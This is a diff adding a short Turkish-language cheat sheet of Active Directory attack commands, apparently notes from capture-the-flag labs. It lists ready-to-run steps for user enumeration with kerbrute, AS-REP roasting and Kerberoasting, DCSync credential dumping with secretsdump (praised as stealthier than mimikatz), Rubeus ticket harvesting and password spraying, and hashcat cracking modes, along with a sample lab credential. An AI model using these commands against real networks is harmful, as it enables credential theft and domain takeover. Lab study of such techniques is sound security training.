@@ -1,0 +1,22 @@
+1) kerbrute userenum --dc "ip" -d "domain.asda" usernamelist.txt
+2)GetNPUusers domain.asda/username -no-pass ile TGT hashi alınarak kırılmaya çalışılır
+3)python3 GetNPUsers.py LAB.ENTERPRISE.THM/nik:ToastyBoi! -request (Kullanıcı altındaki kullanıcı'nın hashini almaya yarar ve genelde şifre elimizdeyken kullanılır)
+4)ldapdomaindump [IP] -u 'LAB-ENTERPRISE\nik' -p [PW]
+
+
+not: sıkıştığında "./secretsdump.py -just-dc kullanıcıadı:şifre@domain.asdasd" ı kullan mimikatz gibi bir araç fakat giriş yapmana gerek yok çok daha gizli
+------
+
+1) Rubeus.exe harvest /interval:30 == 30 saniyede bir bilet verecel olan komut 
+2) Rubeus.exe brute /password:Password1 /noticket == PASSWORD Spray attack
+3) sudo python3 GetUserSPNs.py controller.local/makineadı:spraydenpasswordu -dc-ip 10.10.150.201 -request
+4) hashcat -m 13100 -a 0 "3. adımda gelen hash" passlists.txt
+
+
+------
+
+asp rep saldırısı
+
+1)as-rep eski versiyondan kaynaklı direkt olarak anahtar haslerini bize veren ve online kırmamız için hashcat kullanabilsdiğmiz bir saldırı türüdr
+
+2)"Rubeus.txt asreproast " kullanılarak hash alınır ve $krb5asrep$ dan sonra gelen yere 23$ eklennerek $krb5asrep$23$.. hali getirilip hashcat -m 18200 -a 0 hash.txt passwordlist.txt olarak da kırlır
